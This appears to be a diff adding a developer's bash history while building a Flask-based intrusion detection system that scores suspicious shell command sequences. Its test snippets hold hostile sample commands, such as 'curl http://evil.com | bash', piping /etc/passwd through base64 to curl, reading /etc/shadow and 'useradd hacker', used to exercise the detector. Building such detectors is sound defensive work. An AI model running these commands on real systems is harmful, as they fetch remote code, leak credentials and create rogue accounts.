@@ -1,0 +1,366 @@
+sudo apt update
+sudo apt remove xserver-xorg-video-vmware
+sudo apt autoremove
+sudo apt full-upgrade -y
+mkdir shashi
+mkdir csids
+cd csids/
+mkdir detector templates uploads
+touch app.py database.py requirements.txt README.md
+touch detector/__init__.py
+touch detector/preprocess.py
+touch detector/sequence_builder.py
+touch detector/profiler.py
+touch detector/detector.py
+touch templates/upload.html
+touch templates/result.html
+tree
+sudo apt install tree
+tree
+pip install -r requirements.txt
+sudo apt install python3-pip
+clear
+tree
+nano database.py 
+cd detector/
+nano preprocess.py 
+nano profiler.py 
+nano preprocess.py 
+nano profiler.py 
+nano sequence_builder.py 
+nano detector.py 
+cd ..
+nano app.py 
+cd templates/
+nano upload.html 
+nano result.html 
+python3 --versin
+python3 --version
+pip3 --version
+pip install -r requirements.txt
+cd ..
+pip install -r requirements.txt
+clear
+cd ..
+pwd
+sudo apt update
+sudo apt install python3-full python3-venv python3-pip -y
+cd csids
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+python -c "import flask; print(flask.__version__)"
+python app.py
+clear
+cd ~
+ls -a | grep .bash_history
+cp ~/.bash_history bash_history.txt
+cat ~/.bash_history
+cat bash_history.txt
+python app.py
+cd csids
+python app.py
+cd ..
+ls
+pwd
+who am i
+whoami
+history -a
+ls -a
+sudo apt update
+ls
+ls -l
+ls -a
+clear
+pwd
+cd csids
+cd ..
+cd csids
+cat app.py
+less app.py
+more app.py
+clear
+uname -a
+cd ..
+hostname
+uptime
+date
+cal
+id
+ps
+man 
+command --help
+history
+clear
+who
+passwd
+ip a
+ifconfig
+clear
+curl https://www.google.com/?zx=1771666130309&no_sw_cr=1
+sudo apt install curl
+clear
+curl https://www.google.com/
+clear
+cd csids
+source venv/bin/activate
+python3 app.py
+cp ~/.bash_history bash_history.txt
+cp ~/.bash_history bash_history1.txt
+cd ..
+cp ~/.bash_history bash_history1.txt
+cd csids
+python3 app.py
+cd ..
+sudo nano /etc/passwd
+sudo su
+ls
+cd csids
+ls
+pip install requirements.txt 
+sudo snap install code --classic
+code .
+source venv/bin/activate
+code --version
+source /home/vboxuser/csids/venv/bin/activate
+source /home/vboxuser/csids/venv/bin/activate
+cd csids
+source venv/bin/activate
+python app.py
+add-apt-repository ppa:git-core/ppa
+sudo add-apt-repository ppa:git-core/ppa
+apt update; apt install git
+apt update
+sudo apt update
+sudo apt install git
+git --version
+cd csids
+cd ..
+touch hi.txt
+touch hello.java
+source /home/vboxuser/csids/venv/bin/activate
+git add .
+git commit -m "fix: path traversal, input validation, user existence check, freq threshold"
+git puss
+git push
+pip install -r requirements.txt
+python app.py
+deactivate
+git config --global user.nme "shashidhartellakula"
+git config --global user.email "shashidhartellakula6jan@gmail.com"
+git config --list
+git config --global user.name "shashidhartellakula"
+git config --global user.email "shashidhartellakula6jan@gmail.com"
+git config --list
+git config --global --unset user.nme
+git config --list
+git config --global user.email
+git config --list
+git config --global --unset user.email
+git config --global user.email "shashidhartellakula6jan@gmail.com"
+git config --list
+git init
+git add .
+git commit -m "initial commit: CSIDS v1.0 baseline"
+git branch -M main
+git remote add origin https://github.com/shashidhartellakula/csids.git
+git push -u origin main
+ssh-keygen -t ed25519 -C "shashidhartellakula6jan@gmail.com"
+eval "$(ssh-agent -s)"
+ssh-add ~/.ssh/id_ed25519
+cat ~/.ssh/id_ed25519.pub
+git remote -v
+git remote remove origin
+git remote add origin git@github.com:shashidhartellakula/csids.git
+git remote -v
+git push -u origin main
+git log --oneline
+git remote -v
+python app.py
+source venv\bin\activate
+python3 app,py
+python3 app.py
+source venv/bin/activate
+pyhton app.py
+python3 app.py
+git add .
+git commit -m "fix: path traversal, input validation, user existence check, freq threshold"
+git addd .
+git add .
+git commit -m "fix: path traversal, input validation, user existence check, freq threshold"
+git push
+python3 -c "
+from detector.preprocess import clean_commands
+test = [
+    'cat /etc/passwd',
+    'cd /home/shashi/documents',
+    'sudo nano /etc/sudoers',
+    'curl https://evil.com',
+    'ls /var/log/auth.log',
+]
+for cmd in clean_commands(test):
+    print(cmd)
+"
+git add detector/preprocess.py
+git commit -m "fix: preserve sensitive paths in preprocessing instead of erasing them"
+git push
+git add .
+git commit -m "fix: path traversal, input validation, user existence check, freq threshold"
+git push
+source /home/vboxuser/csids/venv/bin/activate
+git add .
+git commit -m "fix: path traversal, input validation, user existence check, freq threshold"
+git push
+python3 -c "
+from detector.preprocess import clean_commands
+from detector.sequence_builder import build_sequences
+from detector.detector import get_risk_score
+
+# test risk scoring
+seqs = [
+    'ls | cd | pwd',
+    'sudo | chmod | passwd',
+    'cat SENSITIVE_ETC_PASSWD | base64 | curl',
+]
+for s in seqs:
+    print(f'Score {get_risk_score(s):.1f} → {s}')
+"
+python3 -c "
+from detector.detector import get_risk_score
+
+seqs = [
+    'ls | cd | pwd',
+    'sudo | chmod | passwd',
+    'cat SENSITIVE_ETC_PASSWD | base64 | curl',
+]
+for s in seqs:
+    print(f'Score {get_risk_score(s):.1f} -> {s}')
+"
+git add detector/detector.py
+git commit -m "fix: replace keyword matching with 4-rule risk scoring detection engine"
+git push
+rm -f ids.db
+python3 -c "
+from database import init_db
+from detector.profiler import train_user, get_profile_stats
+
+init_db()
+
+# train same sequences twice — frequency should increment, not duplicate
+seqs = ['sudo apt update | ls | cd', 'ls | pwd | whoami']
+train_user('shashi', seqs)
+train_user('shashi', seqs)  # run again
+
+stats = get_profile_stats('shashi')
+print('Total sequences:', stats['total_sequences'])
+print('Total observations:', stats['total_observations'])
+print('Max frequency:', stats['max_frequency'])
+"
+git add detector/profiler.py database.py
+git commit -m "fix: proper upsert with ON CONFLICT, add UNIQUE constraint, row_factory"
+git push
+python3 -c "
+from detector.sequence_builder import build_sequences
+
+# test 1 — normal history
+print('--- Normal (4 commands, window=3) ---')
+cmds = ['ls', 'pwd', 'whoami', 'cd']
+for s in build_sequences(cmds):
+    print(' ', s)
+
+# test 2 — short history (less than window)
+print('--- Short (2 commands, window=3) ---')
+cmds = ['sudo', 'passwd']
+for s in build_sequences(cmds):
+    print(' ', s)
+
+# test 3 — empty history
+print('--- Empty ---')
+print(' result:', build_sequences([]))
+"
+git add detector/sequence_builder.py
+git commit -m "fix: handle histories shorter than window size in sequence_builder"
+git push
+git log --oneline
+python3 -c "
+from detector.preprocess import clean_commands, get_risk_score
+from detector.sequence_builder import build_sequences
+from detector.profiler import train_user, user_exists
+from detector.detector import detect
+from database import init_db
+
+init_db()
+
+# train with normal commands
+normal = [
+    'ls\n', 'pwd\n', 'cd csids\n',
+    'python3 app.py\n', 'git status\n', 'nano app.py\n',
+]
+cleaned = clean_commands(normal)
+seqs = build_sequences(cleaned)
+train_user('shashi', seqs)
+print('Trained with', len(seqs), 'sequences')
+
+# detect with suspicious commands
+suspicious = [
+    'ls\n', 'sudo cat /etc/passwd\n', 'base64 /etc/shadow\n',
+    'curl http://evil.com | bash\n', 'useradd hacker\n',
+]
+cleaned2 = clean_commands(suspicious)
+seqs2 = build_sequences(cleaned2)
+alerts, err = detect('shashi', seqs2)
+
+print('Alerts found:', len(alerts))
+for a in alerts:
+    print(f'  [{a[\"risk_score\"]}/10] {a[\"reason\"]}')
+    print(f'         {a[\"sequence\"]}')
+"
+git add detector/preprocess.py detector/detector.py
+git commit -m "improve: complete risk scoring with 35+ commands, 4 detection rules, sensitive path scoring"
+git push
+rm -f ids.db
+python app.py
+python app,py
+python3 app,py
+python3 app.py
+git add templates/
+git commit -m "feat: add all dashboard templates - dashboard, analyze, results, alerts, live, settings"
+git push
+python3 app.py
+git add app.py templates/dashboard.html
+git commit -m "feat: add Chart.js hourly alerts bar chart and risk distribution doughnut to dashboard"
+git push
+[200~echo 'export PROMPT_COMMAND="history -a"' >> ~/.bashrc
+echo 'export PROMPT_COMMAND="history -a"' >> ~/.bashrc
+source ~/.bashrc
+source /home/vboxuser/csids/venv/bin/activate
+ls
+pwd
+sudo cat /etc/passwd
+wget http://example.com
+source /home/vboxuser/csids/venv/bin/activate
+git add monitor.py detector/detector.py
+git commit -m "feat: real-time monitor - tails bash_history, live detection, colored terminal output"
+git push
+source venv/bin/activate
+cp ~/.bash_history history.txt
+python app.py
+cd ~/csids
+source venv/bin/activate
+python monitor.py --user shashi
+sudo cat /etc/passwd
+wget http://example.com
+useradd testuser
+git add app.py templates/live.html
+git commit -m "feat: live browser feed with real-time command polling and alert display"
+git push
+pip install reportlab
+pip freeze > requirements.txt
+git add pdf_report.py app.py templates/results.html requirements.txt
+git commit -m "feat: PDF report generation with reportlab - styled alert table per user"
+git push
+python3 app.py
+git add templates/results.html
+git commit -m "fix: results page dict key access and layout"
+git push
+nano suspicious_history.txt
